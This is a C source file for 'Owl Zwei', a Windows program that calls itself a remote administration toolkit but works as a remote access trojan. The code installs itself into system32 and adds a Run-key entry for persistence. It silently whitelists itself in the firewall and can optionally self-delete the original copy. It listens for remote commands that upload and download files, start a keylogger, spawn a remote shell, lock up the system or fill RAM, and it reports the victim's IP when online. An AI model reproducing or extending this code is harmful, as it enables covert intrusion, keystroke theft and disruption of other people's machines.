/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#include "owl.h"
/*
#pragma comment(linker,"/NODEFAULTLIB")

#ifndef _DEBUG
#pragma comment(linker,"/merge:.rdata=.data")
#pragma comment(linker,"/merge:.text=.data")
#pragma comment(linker,"/merge:.reloc=.data")
#pragma comment(linker,"/FILEALIGN:0x200")
#endif	// _DEBUG
*/
//uncomment the following line if you want the melting capability
//i.e., on the first run, the executable will automatically install itself
//and will self-delete itself!!
//#define OWL_MELT
/*************************************************************************************************************/
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"Winmm.lib")
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"Advapi32.lib")
#pragma comment(lib,"Wininet.lib")
/*************************************************************************************************************/

int APIENTRY WinMain( HINSTANCE hInstance , HINSTANCE hPrevInstance ,LPSTR lpCmdLine , int nShowCmd ){
	
	
	SOCKET listenfd,connfd;
	TCHAR szMyPath[MAX_PATH],expPath[MAX_PATH],currDir[MAX_PATH];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	BOOL foreignRun = FALSE;

	GetModuleFileName( NULL, szMyPath, MAX_PATH );	
	
	//MB(szMyPath);
	//wsprintf( expPath , "%s\\system32" , getenv("SYSTEMROOT") );
	
	GetSystemDirectory( expPath , MAX_PATH );
	
	//MB(expPath);
	
	if( check_for_deinstall( lpCmdLine ) ){
		DoUninstall( lpCmdLine );
		exit(0);
	}
	
	if( !strstr( szMyPath , expPath ) ){
		DoFirstRunTasks();
		memset( &si , 0 , sizeof(STARTUPINFO) );
		memset( &pi , 0 , sizeof(PROCESS_INFORMATION) );
		si.cb = sizeof(STARTUPINFO);
#ifdef OWL_MELT
		int m = CreateProcess( expPath, NULL, NULL, FALSE, 0, NULL, NULL, 0, &si, &pi );
		SelfDelete();
		exit(0);
#endif
	}
	
	Sleep(2000);
	new_thread( InternetConnectionCheckerProc, NULL );
	listenfd = start_server( 4000 );
	while( 1 ){
		connfd = accept_connection( listenfd , NULL , NULL );
		if( connfd < 0 ) continue;

		new_thread( HandleClient , &connfd );
	}
	closesocket(connfd);
	closesocket(listenfd);
	WSACleanup();
	
	return 0;
}
/*************************************************************************************************************/
void AddOwlToTrustedApps( bool add ){
	HKEY hKey;
	char *valname = "D:\\Owl_zwei\\Debug\\Owl_zwei.exe";
	char *val = "D:\\Owl_zwei\\Debug\\Owl_zwei.exe:*:Enabled:@xpsp2res.dll,-22019";
	int n = RegOpenKeyEx( HKEY_LOCAL_MACHINE , "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List",
					0 , KEY_ALL_ACCESS , &hKey );
	if (n != ERROR_SUCCESS )
		return;
	if( add )
		RegSetValueEx( hKey , valname , 0 , REG_SZ , (BYTE*)val , strlen(val) + 1 );
	else
		RegDeleteValue( hKey , valname );
	RegCloseKey( hKey );
}
/*************************************************************************************************************/
int InstallOwl( char *path , bool install ){

	char owl_path[1024];
	GetModuleFileName( NULL , owl_path , sizeof(owl_path) );
	/*MB(owl_path);
	if( -1 == cp( owl_path , path , true ) ){
		MB("cp failed : -1");
		return -1;
	}
	*/

	strcpy( owl_installed_path , path  );
	
	HKEY hKey;
	int n = RegOpenKeyEx( HKEY_LOCAL_MACHINE , "Software\\Microsoft\\Windows\\CurrentVersion\\Run" , 0 , KEY_ALL_ACCESS , &hKey ); 
	if( n != ERROR_SUCCESS ){ 
		//MB("Run RS Failed");
		return -1;
	}
	RegSetValueEx( hKey , OWL_MONIKER , 0 , REG_SZ , (BYTE*)path , strlen(path) );
	RegCloseKey( hKey );
	return 0;
}
/*************************************************************************************************************/
void DoFirstRunTasks(){
	
	AddOwlToTrustedApps( true );
	char install_path[2048];
	wsprintf( install_path , "%s\\system32\\%s" , getenv("SYSTEMROOT") , OWL_MONIKER );
	//MB(install_path);
	InstallOwl( install_path );
	
	return;
}
/*************************************************************************************************************/
DWORD WINAPI HandleClient( LPVOID param ){
	
	SOCKET s = *(SOCKET*)param;
	char buf[1024],tmp[64];
	struct cmd_t cmd;
	int n;
	while(1){
		n = recv( s , buf , 1023 , 0 );
		buf[n] = 0;
		//MB(buf);
		if( n == 0 )
			break;
		parse_cmd( buf , &cmd );
		int sec = cmd.cmd_object;
		int arg = cmd.args;
		char *p = cmd.addnl.str;
		//wsprintf( tmp , "%d::%d" , sec , arg );
		//MB(tmp);
		if( sec == CMD_FILE ){
			switch( arg ){
			case FILE_SDIR:
				SendDirTree( s , p , 0 );
				break;
			case FILE_SDIREX:
				SendDirTree( s , p , 1 );
				break;
			case FILE_SDRV:
				SendDriveSet( s );
				break;
			case FILE_SEND:
				SendFile( s , p );
				break;
			case FILE_RECV:
				RecvFile( s , p );
				break;
			case FILE_MKDIR:
				LocalMkDir( p );
				break;
			default:
				SendLn( s , "***file: bad args\r\n" );
			}
		}
		else if( sec == CMD_HW ){
			switch( arg ){
			case HW_OPENCD:
				OpenCDTray();
				break;
			case HW_CLOSECD:
				CloseCDTray();
				break;
			case HW_MOUSE_R:
				SetMouseBns( MOUSE_RT );
				break;
			case HW_MOUSE_L:
				SetMouseBns( MOUSE_LT );
				break;
			case HW_MOUSE_SW:
				SwapMouseBns();
				break;
			case HW_MONITOR1:
				MonitorPower( 1 );
				break;
			case HW_MONITOR0:
				MonitorPower( 0 );
				break;
			case HW_DB_CLK:
				DblClkDelay( cmd.addnl.nums[0] );
				break;
			case HW_INPUT0:
				EnableInput( false );
				break;
			case HW_INPUT1:
				EnableInput( true );
				break;
			case HW_REBOOT:
				Reboot();
				break;
			case HW_SHTDWN:
				ShutDown();
				break;
			default:
				SendLn( s , "***bad args\r\n" );
			}
		}
		else if( sec == CMD_KEYBD ){
			switch( arg ){
			case KEYBD_STARTLOG:
				KeyLog( true );
				break;
			case KEYBD_STOPLOG:
				KeyLog( false );
				break;
			default:
				SendLn( s , "***keybd: bad args\r\n" );
			}
		}
		else if( sec == CMD_MOUSE ){
			switch( arg ){
			case MOUSE_FLY_STOP:
				FlyMousePtr( false );
				break;
			case MOUSE_FLY:
				FlyMousePtr( true );
				break;
			case MOUSE_FLY_CLK:
				FlyMousePtrClick( true );
				break;
			case MOUSE_RESTRICT:
				RestrictMouseMovementTo(cmd.addnl.nums[0],
										cmd.addnl.nums[1],
										cmd.addnl.nums[2],
										cmd.addnl.nums[3]
										);
				break;
			case MOUSE_SHOW:
				ShowMouseCursor( true );
				break;
			case MOUSE_HIDE:
				ShowMouseCursor( false );
				break;
			case MOUSE_CLK:
				MouseClick( cmd.addnl.nums[0] );
				break;
			case MOUSE_CLK_PT:
				MouseClickPoint( cmd.addnl.nums[1],
								 cmd.addnl.nums[2],
								 cmd.addnl.nums[0]
							   );
				break;
			case MOUSE_SETPOS:
				SetMousePos( cmd.addnl.nums[0],
							 cmd.addnl.nums[1]
							 );
				break;
			default:
				SendLn( s , "***mouse: bad args\r\n" );
			}
		}
		else if( sec == CMD_SHELL ){
			if( arg == SHELL_SPAWN )
				CreateRemoteShell( s );
		}
		else if( sec == CMD_SYS ){
			unsigned long m;
			unsigned __int64 d;
			char msg[256];

			switch( arg ){
			case SYS_MAXMEM:
				m = GetMaxMem();
				wsprintf( msg , "max mem: %u MiB\r\n" , m );
				SendLn( s ,msg );
				break;
			case SYS_BUSYMEM:
				m = GetBusyMem();
				wsprintf( msg , "mem in use: %u MiB\r\n" , m );
				SendLn( s , msg );
				break;
			case SYS_FREEMEM:
				m = GetFreeMem();
				wsprintf( msg , "free mem: %u MiB\r\n" , m );
				SendLn( s , msg );
				break;
			case SYS_MAXDISK:
				d = GetDiskUsage( cmd.addnl.str , U_TOTAL );
				if( d < 1024 ){
					m = (unsigned long)d;
					wsprintf( msg , "total space on %s: %u MiB\r\n" , cmd.addnl.str , m );
				}else{
					m = (unsigned long)(d/1024);
					wsprintf( msg , "total space on %s: %u GiB\r\n" , cmd.addnl.str , m );
				}
				SendLn( s , msg );
				break;
			case SYS_USEDDISK:
				d = GetDiskUsage( cmd.addnl.str , U_USED );
				if( d < 1024 ){
					m = (unsigned long)d;
					wsprintf( msg , "used space on %s: %u MiB\r\n" , cmd.addnl.str , m );
				}else{
					m = (unsigned long)(d/1024);
					wsprintf( msg , "used space on %s: %u GiB\r\n" , cmd.addnl.str , m );
				}
				SendLn( s , msg );
				break;
			case SYS_FREEDISK:
				d = GetDiskUsage( cmd.addnl.str , U_FREE );
				if( d < 1024 ){
					m = (unsigned long)d;
					wsprintf( msg , "free space on %s: %u MiB\r\n" , cmd.addnl.str , m );
				}else{
					m = (unsigned long)(d/1024);
					wsprintf( msg , "free space on %s: %u GiB\r\n" , cmd.addnl.str , m );
				}
				SendLn( s , msg );
				break;
			case SYS_SYSDIR:
				wsprintf( msg , "system dir is:\'%s\'\r\n" , sysdir() );
				SendLn( s , msg );
				break;
			case SYS_WINDIR:
				wsprintf( msg , "windows dir is:\'%s\'\r\n", windir() );
				SendLn( s , msg );
				break;
			case SYS_CHDIR:
				cd( cmd.addnl.str );
				break;
			case SYS_LOCKUP:
				SendLn( s , "!!!Locking up system!!!... don\'t expect too much after this!\r\n" );
				Sleep(2000);
				LockUp();
				break;
			case SYS_RAMFILL:
				RamFill();
				break;
			default:
				SendLn( s , "***sys: bad args\r\n" );
			}
		}
		else if( sec == CMD_TBAR ){
			switch(arg){
			case TBAR_SHOW:
				ShowTaskBar( true );
				break;
			case TBAR_HIDE:
				ShowTaskBar( false );
				break;
			case TBAR_STBN_SHOW:
				ShowStartBn( true );
				break;
			case TBAR_STBN_HIDE:
				ShowStartBn( false );
				break;
			case TBAR_STBN_FLY1:
				FlyStartBn( true );
				break;
			case TBAR_STBN_FLY0:
				FlyStartBn( false );
				break;
			case TBAR_CLOCK_SHOW:
				ShowClock( true );
				break;
			case TBAR_CLOCK_HIDE:
				ShowClock( false );
				break;
			case TBAR_ENABLE:
				EnableTaskBar( true );
				break;
			case TBAR_DISABLE:
				EnableTaskBar( false );
				break;
			default:
				SendLn( s , "***tb: bad args\r\n" );
			}
		}
		else if( sec == CMD_PRANK ){
			switch(arg){
			case PRANK_DTP_ENABLE:
				EnableDesktop( true );
				break;
			case PRANK_DTP_DISABLE:
				EnableDesktop( false );
				break;
			case PRANK_FU_START:
				if( !strequal( cmd.addnl.str , "" ) )
					szFUStr = cmd.addnl.str;
				FuckYou( true );
				break;
			case PRANK_FU_STOP:
				FuckYou( false );
				break;
			case PRANK_WRUN_START:
				if( cmd.addnl.nums[0] > 0 )
					uiRunWindowsDelay = cmd.addnl.nums[0];
				MakeWindowsRun( true );
				break;
			case PRANK_WRUN_STOP:
				MakeWindowsRun( false );
				break;
			case PRANK_QUAKE_START:
				if( cmd.addnl.nums[0] > 0 )
					uiQuakeDelay = cmd.addnl.nums[0];
				Quake( true );
				break;
			case PRANK_QUAKE_STOP:
				Quake( false );
				break;
			default:
				SendLn( s , "***bad trigger\r\n" );
			}
		}
		else if( sec == CMD_OWL ){
			switch(arg){
			case OWL_UNINSTALL:
				SelfDelete();
				exit(0);
				break;
			default:
				SendLn( s , "***bad trigger\r\n" );
			}
		}

	}
	return 0;
}
/*************************************************************************************************************/
DWORD WINAPI InternetConnectionCheckerProc( LPVOID param ){
	int flag = 1;
	while( !IsConnectedToNet() ){
		if(flag){
			//MB("not connected, in the first tight loop");
			flag = 0;
		}
		Sleep(10000);
	}
	flag = 1;
	//MB("seems we are connected now");
	char *ip;
	char *t = GetExternalIp();
	ip = (char*)malloc(strlen(t) + sizeof(char));
	strcpy(ip,t);
	//MB(ip);
	char buf[256];
	wsprintf(buf,"%s is online",ip);
	OwlDefaultNotify(buf);
	while(1){
		while( !IsConnectedToNet() ){
			Sleep(10000);
		}
		char *tmp = GetExternalIp();
		if( strcmp( ip, tmp ) ){
			wsprintf(buf,"%s rolled over to %s", ip, tmp);
			OwlDefaultNotify(buf);
			if( strlen(tmp) > strlen(ip) ){
				free(ip);
				ip = (char*)malloc( strlen(tmp) + sizeof(char) );
			}
			strcpy(ip,tmp);
		}
		Sleep(10000);
	}
	
	return 0;
}
/*************************************************************************************************************/			


